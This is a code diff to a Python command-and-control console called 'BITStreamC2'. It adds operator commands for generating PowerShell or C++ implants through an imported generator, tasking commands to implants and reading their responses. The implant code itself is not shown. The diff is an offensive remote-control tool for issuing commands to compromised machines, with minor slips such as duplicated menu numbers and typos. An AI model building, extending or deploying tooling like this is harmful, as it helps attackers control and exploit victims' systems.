@@ -2,6 +2,7 @@ import os
 import json
 import subprocess
 import time
+import generate_implant
 
 # Directories and files
 BASE_DIR = os.getcwd()
@@ -27,6 +28,9 @@ def start_server():
     time.sleep(2)  # Give the server time to start
     return server_process
 
+def show_implants():
+    print("To be built!")
+
 # Stop the server script
 def stop_server(server_process):
     if server_process:
@@ -35,25 +39,67 @@ def stop_server(server_process):
         server_process.wait()
         print("[+] Server stopped.")
 
+def help_menu():
+    print("Help Menu")
+    print("[*] show implants -> Show active implants")
+    print("[*] generate implant (ps1 or cpp) -> Generate an implant using either Powershell or C++ (C++ source code will need to be compiled on external Windows system")
+    print("[*] show command -> Show current command to be taksed to implant")
+    print("[*] set command -> Set a command to be tasked to implant")
+    print("[*] show response -> View implant response")
+    print("[*] help -> Show this help menu")
+    print("[*] exit")
+
 # CLI interface
 def c2_cli():
-    print("\n=== C2 Interface ===")
-    print("[1] Set Command")
-    print("[2] View Implant Response")
-    print("[3] Exit")
+    os.system('clear')
+    print("\n=== BITSreamC2 ===")
+    help_menu()
 
     while True:
-        choice = input("\nSelect an option: ")
-        if choice == "1":
+        choice = input("\nBSC2> ")
+        if choice == "clear" or choice == "cls":
+            os.system('clear')
+            
+        elif choice == "show implants" or choice == "sh imp":
+            show_implants()
+            
+        elif choice == "generate implant ps1" or choice == "gen imp ps1":
+            lang = "ps1"
+            gen_implant(lang)
+            
+        elif choice == "generate implant cpp" or choice == "gen imp cpp":
+            lang = "cpp"
+            gen_implant(lang)
+            
+        elif choice == "show command" or choice == "sh cmd":
+            with open(COMMAND_FILE, "r") as f:
+                command_data = json.load(f)
+                command = command_data.get("command", "No command found")
+            print(f"[+] Current command for your implant is: {command}\n")
+            
+        elif choice == "set command" or choice == "set cmd":
             set_command()
-        elif choice == "2":
+            
+        elif choice == "show response" or choice == "sh resp":
             view_response()
-        elif choice == "3":
+            
+        elif choice == "exit":
             print("Exiting...")
             break
-        else:
-            print("Invalid choice. Try again.")
 
+        elif choice == "help":
+            help_menu()
+
+        else:
+            print("Invalid choice.\n")
+            help_menu()
+
+def show_command():
+    with open(COMMAND_FILE, "r") as f:
+        command_data = json.load(f)
+        command = command_data.get("command", "No command found")
+        print(f"[+] Current command for your implant is {command}\n")
+        
 # Set a new command
 def set_command():
     command = input("Enter the command to send to the implant: ").strip()
@@ -74,10 +120,14 @@ def view_response():
     else:
         print("[-] No response file found.")
 
+def gen_implant(lang):
+    generate_implant.gen(lang)
+
 # Main function
 if __name__ == "__main__":
-    print("=== C2 Framework ===")
-    print("[1] Start Server and Launch Operator Interface")
+    print("=== BITStreamC2 ===")
+    print("[1] Start HTTP Server and Launch Operator Interface")
+    print("[2] Start SMB Server and Launch Operator Interface *TODO*")
     print("[2] Exit")
 
     option = input("\nSelect an option: ")
